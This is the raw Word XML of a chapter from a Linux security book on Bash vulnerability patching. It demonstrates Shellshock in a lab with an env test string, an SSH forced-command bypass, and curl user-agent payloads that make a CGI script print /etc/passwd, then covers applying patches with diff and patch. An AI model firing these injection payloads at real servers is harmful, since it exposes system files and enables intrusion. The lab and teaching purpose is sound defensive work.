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7E0" w:rsidRDefault="008777E0">
      <w:pPr>
        <w:pStyle w:val="ChapterNumberPACKT"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>9</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008777E0" w:rsidRDefault="008777E0">
      <w:pPr>
        <w:pStyle w:val="ChapterTitlePACKT"/>
      </w:pPr>
      <w:r>
        <w:t>Bash Vulnerability Patching</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E03A78" w:rsidRPr="00E03A78" w:rsidRDefault="008777E0" w:rsidP="007443EC">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Understanding bash</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">vulnerability </w:t>
      </w:r>
      <w:r w:rsidR="00E03A78">
        <w:t>–</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Shellshock</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008777E0" w:rsidRDefault="008777E0">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>How to do it…</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008777E0" w:rsidRDefault="008777E0">
      <w:pPr>
        <w:pStyle w:val="NormalPACKT"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="008777E0" w:rsidRPr="007443EC" w:rsidRDefault="00AB191B" w:rsidP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bash --version</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008777E0" w:rsidRPr="007443EC" w:rsidRDefault="00AB191B" w:rsidP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env x=’() { :;}; echo shellshock’ bash -c “echo testing”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00AB191B" w:rsidRPr="007443EC" w:rsidRDefault="008777E0" w:rsidP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testvar=”shellshock’</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008777E0" w:rsidRPr="007443EC" w:rsidRDefault="008777E0" w:rsidP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echo $testvar</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008777E0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bash</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008777E0" w:rsidRPr="007443EC" w:rsidRDefault="00AB191B" w:rsidP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echo $testvar</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008777E0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export testvar=”shellshock”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echo $testvar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bash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echo $testvar</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008777E0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x() {echo ‘shellshock’;}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x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export -f x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bash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x</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00AB191B" w:rsidRPr="007443EC" w:rsidRDefault="00AB191B" w:rsidP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 xml:space="preserve">export </w:t>
      </w:r>
      <w:r w:rsidR="008777E0" w:rsidRPr="007443EC">
        <w:rPr>
          <w:rFonts w:ascii="Lucida Console" w:hAnsi="Lucida Console"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
        <w:t>testfunc=’() { echo ‘shellshock’;}’</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008777E0" w:rsidRPr="007443EC" w:rsidRDefault="008777E0" w:rsidP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echo $testfunc</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008777E0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testfunc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bash</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00AB191B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testfunc</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008777E0" w:rsidRPr="007443EC" w:rsidRDefault="00AB191B" w:rsidP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export testfunc=’() { echo ‘shellshock’;}; echo “vulnerable”’</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008777E0" w:rsidRPr="007443EC" w:rsidRDefault="00AB191B">
      <w:pPr>
        <w:pStyle w:val="NormalPACKT"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4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lastRenderedPageBreak/>
        <w:t>bash</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008777E0" w:rsidRDefault="00AB191B" w:rsidP="00AB191B">
      <w:pPr>
        <w:pStyle w:val="NormalPACKT"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="007443EC">
        <w:rPr>
          <w:rFonts w:ascii="Lucida Console" w:hAnsi="Lucida Console"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
        <w:t>testfunc</w:t>
      </w:r>
      <w:r w:rsidR="008777E0" w:rsidRPr="007443EC">
        <w:rPr>
          <w:rFonts w:ascii="Lucida Console" w:hAnsi="Lucida Console"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008777E0" w:rsidRDefault="008777E0" w:rsidP="00AB191B">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Security issues - Shellshock</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008777E0" w:rsidRPr="00AB191B" w:rsidRDefault="008777E0" w:rsidP="00AB191B">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Getting Ready</w:t>
      </w:r>
      <w:r w:rsidRPr="00AB191B">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00AB191B" w:rsidRDefault="00AB191B">
      <w:pPr>
        <w:pStyle w:val="CommandLineWithinBulletEndPACKT"/>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="008777E0" w:rsidRDefault="008777E0">
      <w:pPr>
        <w:pStyle w:val="CommandLineWithinBulletEndPACKT"/>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>apt-get install opens</w:t>
      </w:r>
      <w:r w:rsidR="005D69E7">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>h-server</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008777E0" w:rsidRDefault="008777E0">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>How to do it…</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008777E0" w:rsidRDefault="008777E0">
      <w:pPr>
        <w:pStyle w:val="NormalPACKT"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="008777E0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useradd -d /home/user1 -s /bin/bash user1</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008777E0" w:rsidRPr="007443EC" w:rsidRDefault="005F5BD3" w:rsidP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cat /etc/passwd | grep ‘user1’</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008777E0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cd /home</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005F5BD3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mkdir user1</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005F5BD3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chown -R user1 /home/user1/</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008777E0" w:rsidRPr="007443EC" w:rsidRDefault="005F5BD3" w:rsidP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ssh-keygen -t rsa</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008777E0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cd Desktop</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005F5BD3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ls</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005F5BD3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sftp root@192.168.1.101</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008777E0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put id_rsa.pub /root/</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008777E0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mkdir /home/user1/.ssh</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005F5BD3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cat id_rsa.pub &gt; /home/user1/.ssh/authorized_keys</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008777E0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Style w:val="CodeInTextPACKT"/>
          <w:szCs w:val="19"/>
        </w:rPr>
        <w:t xml:space="preserve">nano </w:t>
      </w:r>
      <w:r w:rsidR="008777E0" w:rsidRPr="007443EC">
        <w:rPr>
          <w:rStyle w:val="CodeInTextPACKT"/>
          <w:szCs w:val="19"/>
        </w:rPr>
        <w:t>etc/ssh/sshd_config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RSAAuthentication yes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PubkeyAuthentication yes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AuthorizedKeysFile</w:t>
      </w:r>
      <w:r w:rsidRPr="007443EC">
        <w:rPr>
          <w:rFonts w:ascii="Lucida Console" w:hAnsi="Lucida Console"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
        <w:tab/>
        <w:t>%h/.ssh/authorized_keys</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008777E0" w:rsidRPr="007443EC" w:rsidRDefault="005F5BD3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ssh user1@192.168.1.101</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B057FD" w:rsidRPr="007443EC" w:rsidRDefault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nano sample.sh</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008777E0" w:rsidRPr="007443EC" w:rsidRDefault="005F5BD3" w:rsidP="00B057FD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#!/bin/bash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set $SSH_ORIGINAL_COMMAND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if [ $SSH_ORIGINAL_COMMAND = “date” ]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then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ab/>
        <w:t>echo ‘restricted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lastRenderedPageBreak/>
        <w:t>else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ab/>
        <w:t>echo “$@”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005F5BD3" w:rsidRPr="007443EC" w:rsidRDefault="005F5BD3" w:rsidP="005F5BD3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fi</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008777E0" w:rsidRPr="007443EC" w:rsidRDefault="008777E0" w:rsidP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chmod +x sample.sh</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B057FD" w:rsidRPr="007443EC" w:rsidRDefault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nano /home/user1/.ssh/authorized_keys</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B057FD" w:rsidRPr="007443EC" w:rsidRDefault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command=”/home/user1/.ssh/sample.sh”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008777E0" w:rsidRPr="007443EC" w:rsidRDefault="00B057FD" w:rsidP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ssh user1@192.168.1.101 date</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008777E0" w:rsidRPr="007443EC" w:rsidRDefault="00B057FD" w:rsidP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ssh user1@192.168.1.101 ‘() { :;}; date’</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B057FD" w:rsidRPr="007443EC" w:rsidRDefault="008777E0" w:rsidP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apt-get install apache2</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008777E0" w:rsidRPr="007443EC" w:rsidRDefault="008777E0" w:rsidP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service apache2 start</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B057FD" w:rsidRPr="007443EC" w:rsidRDefault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Style w:val="CodeInTextPACKT"/>
          <w:szCs w:val="19"/>
        </w:rPr>
        <w:t xml:space="preserve">cd </w:t>
      </w:r>
      <w:r w:rsidR="008777E0" w:rsidRPr="007443EC">
        <w:rPr>
          <w:rStyle w:val="CodeInTextPACKT"/>
          <w:szCs w:val="19"/>
        </w:rPr>
        <w:t>/usr/lib/cgi-bin/</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008777E0" w:rsidRPr="007443EC" w:rsidRDefault="00B057FD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 xml:space="preserve">nano </w:t>
      </w:r>
      <w:r w:rsidR="008777E0" w:rsidRPr="007443EC">
        <w:rPr>
          <w:rFonts w:ascii="Lucida Console" w:hAnsi="Lucida Console"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
        <w:t>example.sh</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B057FD" w:rsidRPr="007443EC" w:rsidRDefault="00BE461B" w:rsidP="00B057FD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#!/bin/bash</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BE461B" w:rsidRPr="007443EC" w:rsidRDefault="00BE461B" w:rsidP="00B057FD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echo ‘Content-type:text/html’</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BE461B" w:rsidRPr="007443EC" w:rsidRDefault="00BE461B" w:rsidP="00B057FD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echo ‘’</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BE461B" w:rsidRPr="007443EC" w:rsidRDefault="00BE461B" w:rsidP="00B057FD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echo ‘Example Page’</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008777E0" w:rsidRPr="007443EC" w:rsidRDefault="008777E0" w:rsidP="00BE461B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chmod +x example.sh</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008777E0" w:rsidRPr="007443EC" w:rsidRDefault="00BE461B" w:rsidP="00BE461B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curl http://192.168.1.101/cgi-bin/example.sh</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008777E0" w:rsidRPr="007443EC" w:rsidRDefault="008777E0" w:rsidP="00BE461B">
      <w:pPr>
        <w:pStyle w:val="NormalPACKT"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7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curl -A ‘() { :;}; echo “Content-type: text/plain”; echo; /bin/cat /etc/passwd http://192.168.1.104/cgi-bin/example.sh</w:t>
      </w:r>
      <w:r w:rsidR="00BF309A" w:rsidRPr="007443EC">
        <w:rPr>
          <w:rFonts w:ascii="Lucida Console" w:hAnsi="Lucida Console"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008777E0" w:rsidRDefault="00BE461B">
      <w:pPr>
        <w:pStyle w:val="NormalPACKT"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="007443EC">
        <w:rPr>
          <w:rFonts w:ascii="Lucida Console" w:hAnsi="Lucida Console"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
        <w:t>curl -A ‘() { :;}; echo “Content-type: text/plain”; echo; /bin/ls –al’ http://192.168.1.104/cgi-bin/example.sh</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008777E0" w:rsidRDefault="008777E0">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>How it works…</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008777E0" w:rsidRDefault="008777E0"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</w:pBdr>
        <w:rPr>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Linux patch management system</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008777E0" w:rsidRDefault="008777E0">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>How to do it…</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008777E0" w:rsidRDefault="008777E0">
      <w:pPr>
        <w:pStyle w:val="NormalPACKT"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00BE461B" w:rsidRDefault="00BE461B" w:rsidP="00BE461B">
      <w:pPr>
        <w:pStyle w:val="NormalPACKT"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CodeInTextPACKT"/>
        </w:rPr>
        <w:t xml:space="preserve">cat </w:t>
      </w:r>
      <w:r w:rsidR="008777E0">
        <w:rPr>
          <w:rStyle w:val="CodeInTextPACKT"/>
        </w:rPr>
        <w:t>/etc/apt/sources.list</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008777E0" w:rsidRDefault="008777E0">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Applying patches in Linux</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008777E0" w:rsidRDefault="008777E0">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>How to do it...</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BE461B" w:rsidRPr="007443EC" w:rsidRDefault="00DE43F2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cat example.c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#include &lt;stdio.h&gt;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int main()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{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printf(“This is an example\n”);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}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008777E0" w:rsidRPr="007443EC" w:rsidRDefault="00DE43F2" w:rsidP="00DE43F2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  <w:lang w:val="en-GB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>cp example.c example_new.c</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008777E0" w:rsidRPr="007443EC" w:rsidRDefault="00DE43F2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 xml:space="preserve">nano </w:t>
      </w:r>
      <w:r w:rsidR="008777E0" w:rsidRPr="007443EC">
        <w:rPr>
          <w:rFonts w:ascii="Lucida Console" w:hAnsi="Lucida Console"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>example_new.c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#include &lt;stdio.h&gt;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int main(</w:t>
      </w:r>
      <w:r w:rsidR="00835D2C" w:rsidRPr="007443EC">
        <w:rPr>
          <w:rFonts w:ascii="Lucida Console" w:hAnsi="Lucida Console"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
        <w:t>int argc</w:t>
      </w:r>
      <w:r w:rsidRPr="007443EC">
        <w:rPr>
          <w:rFonts w:ascii="Lucida Console" w:hAnsi="Lucida Console"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
        <w:t>)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{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DE43F2" w:rsidRPr="007443EC" w:rsidRDefault="00DE43F2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printf(“This is an example\n”);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00835D2C" w:rsidRPr="007443EC" w:rsidRDefault="00835D2C" w:rsidP="00DE43F2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return 0;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008777E0" w:rsidRPr="007443EC" w:rsidRDefault="00DE43F2" w:rsidP="00835D2C">
      <w:pPr>
        <w:pStyle w:val="NormalPACKT"/>
        <w:ind w:left="720"/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</w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008777E0" w:rsidRPr="007443EC" w:rsidRDefault="00835D2C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>diff -u example.c example_new.c &gt; example.patch</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008777E0" w:rsidRPr="007443EC" w:rsidRDefault="00835D2C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>cat example.patch</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008777E0" w:rsidRPr="007443EC" w:rsidRDefault="00835D2C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>patch -b &lt; example.patch</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008777E0" w:rsidRPr="007443EC" w:rsidRDefault="00835D2C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>patch --dry-run &lt; example.patch</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008777E0" w:rsidRPr="007443EC" w:rsidRDefault="008777E0" w:rsidP="00835D2C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  <w:lang w:val="en-GB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>patch &lt; example.patch</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008777E0" w:rsidRPr="007443EC" w:rsidRDefault="00835D2C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>cat example.c</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008777E0" w:rsidRPr="007443EC" w:rsidRDefault="00835D2C" w:rsidP="00835D2C">
      <w:pPr>
        <w:pStyle w:val="NormalPACKT"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Lucida Console" w:hAnsi="Lucida Console"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007443EC">
        <w:rPr>
          <w:rFonts w:ascii="Lucida Console" w:hAnsi="Lucida Console"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>patch -R &lt; example.patch</w:t>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="008777E0" w:rsidRPr="007443EC" w:rsidSect="00F83C8C">
      <w:pgSz w:w="12240" w:h="15840"/>
      <w:pgMar w:top="2347" w:right="2160" w:bottom="2707" w:left="216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en-GB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multilevel"/>
    <w:tmpl w:val="00000005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>
    <w:nsid w:val="00000008"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="00000008"/>
    <w:name w:val="WW8Num41"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerLetter"/>
      <w:lvlText w:val="%1."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="0"/>
        </w:tabs>
        <w:ind w:left="1463" w:hanging="386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8">
    <w:nsid w:val="00000009"/>
    <w:multiLevelType w:val="singleLevel"/>
    <w:tmpl w:val="00000009"/>
    <w:name w:val="WW8Num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mirrorMargin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F4C49"/>
    <w:rsid w:val="000F62BD"/>
    <w:rsid w:val="001A0067"/>
    <w:rsid w:val="00231E3A"/>
    <w:rsid w:val="004B0028"/>
    <w:rsid w:val="00535B43"/>
    <w:rsid w:val="005D69E7"/>
    <w:rsid w:val="005E513B"/>
    <w:rsid w:val="005F5BD3"/>
    <w:rsid w:val="007443EC"/>
    <w:rsid w:val="008042D7"/>
    <w:rsid w:val="00835D2C"/>
    <w:rsid w:val="00853F06"/>
    <w:rsid w:val="008777E0"/>
    <w:rsid w:val="008A2A9B"/>
    <w:rsid w:val="00926735"/>
    <w:rsid w:val="00AB191B"/>
    <w:rsid w:val="00B057FD"/>
    <w:rsid w:val="00BC76A7"/>
    <w:rsid w:val="00BE461B"/>
    <w:rsid w:val="00BF309A"/>
    <w:rsid w:val="00C503E3"/>
    <w:rsid w:val="00CE39FD"/>
    <w:rsid w:val="00DE43F2"/>
    <w:rsid w:val="00E03A78"/>
    <w:rsid w:val="00E85B99"/>
    <w:rsid w:val="00EF4C49"/>
    <w:rsid w:val="00F83C8C"/>
    <w:rsid w:val="00FE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8C"/>
    <w:pPr>
      <w:suppressAutoHyphens/>
      <w:spacing w:before="60" w:after="60"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
      <w:bCs/>
      <w:szCs w:val="24"/>
      <w:lang w:eastAsia="zh-CN"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading1">
    <w:name w:val="heading 1"/>
    <w:next w:val="NormalPACKT"/>
    <w:qFormat/>
    <w:rsid w:val="00F83C8C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365F91"/>
      <w:tabs>
        <w:tab w:val="num" w:pos="432"/>
      </w:tabs>
      <w:suppressAutoHyphens/>
      <w:spacing w:before="400" w:after="60"/>
      <w:ind w:left="432" w:hanging="432"/>
      <w:outlineLvl w:val="0"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
      <w:b/>
      <w:iCs/>
      <w:color w:val="FFFFFF"/>
      <w:kern w:val="1"/>
      <w:sz w:val="32"/>
      <w:szCs w:val="32"/>
      <w:lang w:val="en-GB" w:eastAsia="zh-CN"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading2">
    <w:name w:val="heading 2"/>
    <w:next w:val="NormalPACKT"/>
    <w:qFormat/>
    <w:rsid w:val="00F83C8C"/>
    <w:pPr>
      <w:keepNext/>
      <w:tabs>
        <w:tab w:val="num" w:pos="576"/>
      </w:tabs>
      <w:suppressAutoHyphens/>
      <w:spacing w:before="320" w:after="60"/>
      <w:ind w:left="576" w:hanging="576"/>
      <w:outlineLvl w:val="1"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
      <w:b/>
      <w:bCs/>
      <w:iCs/>
      <w:color w:val="365F91"/>
      <w:sz w:val="28"/>
      <w:szCs w:val="28"/>
      <w:lang w:val="en-GB" w:eastAsia="zh-CN"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading3">
    <w:name w:val="heading 3"/>
    <w:next w:val="NormalPACKT"/>
    <w:qFormat/>
    <w:rsid w:val="00F83C8C"/>
    <w:pPr>
      <w:keepNext/>
      <w:tabs>
        <w:tab w:val="num" w:pos="720"/>
      </w:tabs>
      <w:suppressAutoHyphens/>
      <w:spacing w:before="240" w:after="60"/>
      <w:ind w:left="720" w:hanging="720"/>
      <w:outlineLvl w:val="2"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
      <w:b/>
      <w:iCs/>
      <w:color w:val="000000"/>
      <w:sz w:val="26"/>
      <w:szCs w:val="26"/>
      <w:lang w:val="en-GB" w:eastAsia="zh-CN"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading4">
    <w:name w:val="heading 4"/>
    <w:next w:val="NormalPACKT"/>
    <w:qFormat/>
    <w:rsid w:val="00F83C8C"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="num" w:pos="864"/>
      </w:tabs>
      <w:suppressAutoHyphens/>
      <w:spacing w:before="160" w:after="60"/>
      <w:ind w:left="864" w:hanging="864"/>
      <w:outlineLvl w:val="3"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
      <w:b/>
      <w:iCs/>
      <w:color w:val="000000"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="28"/>
      <w:lang w:val="en-GB" w:eastAsia="zh-CN"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading5">
    <w:name w:val="heading 5"/>
    <w:next w:val="NormalPACKT"/>
    <w:qFormat/>
    <w:rsid w:val="00F83C8C"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="num" w:pos="1008"/>
      </w:tabs>
      <w:suppressAutoHyphens/>
      <w:spacing w:before="80" w:after="60"/>
      <w:ind w:left="1008" w:hanging="1008"/>
      <w:outlineLvl w:val="4"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
      <w:b/>
      <w:color w:val="000000"/>
      <w:sz w:val="22"/>
      <w:szCs w:val="26"/>
      <w:lang w:val="en-GB" w:eastAsia="zh-CN"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading6">
    <w:name w:val="heading 6"/>
    <w:basedOn w:val="Heading2"/>
    <w:next w:val="NormalPACKT"/>
    <w:qFormat/>
    <w:rsid w:val="00F83C8C"/>
    <w:pPr>
      <w:numPr>
        <w:ilvl w:val="5"/>
      </w:numPr>
      <w:tabs>
        <w:tab w:val="num" w:pos="576"/>
      </w:tabs>
      <w:spacing w:before="120"/>
      <w:ind w:left="576" w:hanging="576"/>
      <w:outlineLvl w:val="5"/>
    </w:pPr>
    <w:rPr>
      <w:b w:val="0"/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83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num2z0">
    <w:name w:val="WW8Num2z0"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num3z0">
    <w:name w:val="WW8Num3z0"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num4z0">
    <w:name w:val="WW8Num4z0"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num5z0">
    <w:name w:val="WW8Num5z0"/>
    <w:rsid w:val="00F83C8C"/>
    <w:rPr>
      <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:cs="Symbol"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num6z0">
    <w:name w:val="WW8Num6z0"/>
    <w:rsid w:val="00F83C8C"/>
    <w:rPr>
      <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:cs="Symbol"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num7z0">
    <w:name w:val="WW8Num7z0"/>
    <w:rsid w:val="00F83C8C"/>
    <w:rPr>
      <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:cs="Symbol"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num8z0">
    <w:name w:val="WW8Num8z0"/>
    <w:rsid w:val="00F83C8C"/>
    <w:rPr>
      <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:cs="Symbol"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num9z0">
    <w:name w:val="WW8Num9z0"/>
    <w:rsid w:val="00F83C8C"/>
